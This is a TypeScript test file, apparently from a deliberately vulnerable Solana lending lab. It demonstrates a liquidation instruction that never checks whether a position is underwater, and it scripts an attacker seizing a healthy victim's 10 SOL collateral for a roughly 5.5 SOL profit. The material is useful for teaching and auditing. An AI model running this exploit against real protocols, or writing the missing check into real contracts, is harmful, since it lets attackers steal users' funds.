/**
 * VULN 14 — liquidation without a health-factor check.
 *
 * The victim's position is HEALTHY by the protocol's own rules: 10 SOL
 * collateral, 5 SOL debt (LTV 50% — borrow caps at 80%). `liquidate` never
 * verifies that the position is actually underwater, so the attacker
 * "liquidates" it: pays the 5 SOL debt, pockets a 0.5 SOL insurance bonus
 * and seizes the full 10 SOL collateral. Net profit ~5.5 SOL.
 */
import { assert } from "chai";
import {
  PROG_IDS, provider, anchorProgram, findPda, seedsBuf, airdrop, newFundedKeypair,
  solBalance, BN, LAMPORTS_PER_SOL,
} from "./util";

describe("vuln14 liquidation of a healthy position", () => {
  const program = anchorProgram("vuln14_liquidation", PROG_IDS.vuln14);
  const pool = findPda([seedsBuf("pool")[0]], PROG_IDS.vuln14)[0];
  const posOf = (user: any) =>
    findPda([seedsBuf("position")[0], user.publicKey.toBuffer()], PROG_IDS.vuln14)[0];

  let victim: any, attacker: any, position: PublicKey;
  let attackerBefore = 0;

  before(async () => {
    await airdrop(provider.wallet.publicKey, 50);
    victim = await newFundedKeypair();
    attacker = await newFundedKeypair();

    await program.methods.initialize(new BN(10 * LAMPORTS_PER_SOL))
      .accounts({ pool, treasury: provider.wallet.publicKey })
      .rpc();

    // Healthy position: 10 SOL collateral, 5 SOL debt (LTV 50% < 80%).
    position = posOf(victim);
    await program.methods.depositCollateral(new BN(10 * LAMPORTS_PER_SOL))
      .accounts({ position, user: victim.publicKey })
      .signers([victim]).rpc();
    await program.methods.borrow(new BN(5 * LAMPORTS_PER_SOL))
      .accounts({ position, pool, user: victim.publicKey })
      .signers([victim]).rpc();

    const pos = await program.account.position.fetch(position);
    assert.equal(pos.collateral.toString(), (10 * LAMPORTS_PER_SOL).toString());
    assert.equal(pos.debt.toString(), (5 * LAMPORTS_PER_SOL).toString());
  });

  it("borrow cap works: 80% LTV is enforced", async () => {
    try {
      await program.methods.borrow(new BN(5 * LAMPORTS_PER_SOL)) // debt would be 10 = 100% LTV
        .accounts({ position, pool, user: victim.publicKey })
        .signers([victim]).rpc();
      assert.fail("over-LTV borrow should have failed");
    } catch (e: any) {
      assert.include(JSON.stringify(e), "OverLtv");
    }
  });

  it("attacker liquidates the HEALTHY position and takes ~5.5 SOL", async () => {
    attackerBefore = await solBalance(attacker.publicKey);

    await program.methods.liquidate()
      .accounts({ position, pool, liquidator: attacker.publicKey })
      .signers([attacker]).rpc();

    // Paid 5 SOL (debt) -> received 10 SOL (collateral) + 0.5 SOL (bonus).
    const after = await solBalance(attacker.publicKey);
    const profit = after - attackerBefore;
    assert.isAtLeast(profit, 5.5 * LAMPORTS_PER_SOL - 10_000);
    assert.isBelow(profit, 5.6 * LAMPORTS_PER_SOL + 10_000);

    const gone = await provider.connection.getAccountInfo(position);
    assert.isNull(gone);
  });

  it("pool was drained by the bonus; victim's collateral is gone", async () => {
    // Pool: 10 (initial) - 5 (borrow) + 5 (debt repaid) - 0.5 (bonus) = 9.5 SOL.
    const poolLamports = await solBalance(pool);
    assert.isBelow(poolLamports, 9.6 * LAMPORTS_PER_SOL);
    assert.isAtLeast(poolLamports, 9.4 * LAMPORTS_PER_SOL);
    // The victim lost 10 SOL of collateral for a 5 SOL debt — a 50% haircut
    // on a perfectly healthy position, impossible to recover.
    assert.isNull(await provider.connection.getAccountInfo(position));
  });
});
